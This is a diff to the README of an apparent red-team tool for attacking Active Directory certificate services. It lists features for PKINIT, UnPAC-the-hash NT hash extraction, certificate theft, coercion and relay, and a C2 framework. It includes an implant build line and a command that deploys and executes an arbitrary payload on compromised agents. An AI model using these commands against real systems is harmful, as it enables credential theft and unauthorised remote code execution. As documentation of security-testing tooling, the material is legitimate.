@@ -52,17 +52,18 @@ cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
 - ESC14 weak explicit mappings detection
 - Shadow Credentials (msDS-KeyCredentialLink add/list/remove, key persisted before LDAP modify)
 - Golden certificate forging (self-signed or CA-key signed)
-- Auto-pwn orchestration (enumerate → exploit → forge → PKINIT commands)
-- Certificate theft playbook (THEFT1-THEFT5) via `--theft 1` through `--theft 5`
-- PKINIT command generation (certipy, Rubeus, impacket)
-- UnPAC-the-hash command generation
+- Auto-pwn orchestration (enumerate → exploit → PKINIT → UnPAC → NT hash)
+- PKINIT authentication (RFC 4556 DH mode, CMS SignedData, AS-REQ/REP, ccache output)
+- UnPAC-the-hash (U2U TGS-REQ, PAC_CREDENTIAL_INFO decryption, NT hash extraction)
+- Certificate theft: THEFT4 automated via LDAP userCertificate extraction; THEFT1-3,5 guidance playbooks
+- External-tool guidance generation (certipy, Rubeus, impacket) as fallback
 - PetitPotam MS-EFSRPC coercion (SMB2 + DCE/RPC, stateful session)
 - WebDAV coercion for non-admin pivot relay (`--listener-port` for custom port >1024)
 
 ### C2 Framework
 - HTTP/HTTPS listeners with auto-generated TLS certificates
 - Session management (register, poll, command queue, result collection)
-- Certificate persistence: cert-auth implants via forged certificates (Schannel mTLS)
+- Certificate persistence: cert-auth implants via forged certificates (Schannel mTLS with server-side verification)
 - Polling agent: `certstrike agent --config stager.json`
 - File delivery: upload and deploy arbitrary binaries to agents
 - Deploy command: `certstrike deploy --c2-url <url> --session <ID> --file ./payload --path /tmp/svc --execute`
